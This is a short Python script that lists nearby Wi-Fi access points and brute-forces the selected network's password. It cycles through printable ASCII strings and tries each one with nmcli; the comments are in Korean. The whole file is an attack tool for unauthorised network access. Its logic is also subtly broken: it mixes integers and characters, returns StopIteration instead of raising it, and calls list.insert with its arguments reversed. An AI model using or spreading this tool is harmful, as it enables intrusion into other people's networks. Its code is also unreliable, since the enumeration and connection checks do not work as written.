import re
import subprocess
from access_points import get_scanner
from time import sleep, time

class Finder:
    def __init__(self, *args, **kwargs):
        self.ssid = kwargs['ssid']
        self.password = kwargs['password']
        self.main_dict = {}

    def run(self):
        try:
            subprocess.run([ "nmcli", "d", "wifi", "connect", self.ssid, "password", self.password ], timeout=0.5)
        except Exception as exp:
            print("Couldn't connect to name : {}. {}".format(self.ssid, exp))
        sleep(0.5)

class ACSCIIstr(object):
    def __init__(self, start, max):
        self.len = start
        self.maxlen = max
        self.now = [chr(33) for i in range(start)]
        # 0~32는 제외, passphrase는 최소한 readable하다고 가정

    def __iter__(self):
        return iter(''.join(self.now))
    
    def __next__(self):
        idx = len(self.now) - 1
        while(idx >= 0):
            if(ord(self.now[idx]) == 127):
                self.now[idx] = 33
            else:
                self.now[idx] = chr(ord(self.now[idx])+1)
                return self.now
            idx -= 1
        if(idx == -1):
            if(self.len == self.maxlen):
                return StopIteration
            else:
                self.len += 1
                self.now.insert(chr(1), 0)
                return self.now
    


if __name__ == "__main__":
    # AP scanning
    wifi_scanner = get_scanner()
    aps = wifi_scanner.get_access_points()
    for idx, item in enumerate(aps):
        print(idx, item.ssid, item.security)

    # select target AP
    x = (int)(input("select ssid: "))
    
    # WPA2의 경우 최소 8자리 제한 설정
    WPA2 = re.compile('WPA2')
    ssid = aps[x].ssid
    isWPA2 = (bool)(WPA2.match((str)(aps[x].security)))

    x = ACSCIIstr( 8 if isWPA2 else 1, 64)
    starttime = time()
    try:
        while(True):
            password =''.join(next(x))
            print(password)
            if(isWPA2 and len(password) < 8):
                continue
            F = Finder(ssid=ssid, password=password)
            F.run()
    except:
        print("execution time: {}sec".format(round((time() - starttime), 2)))
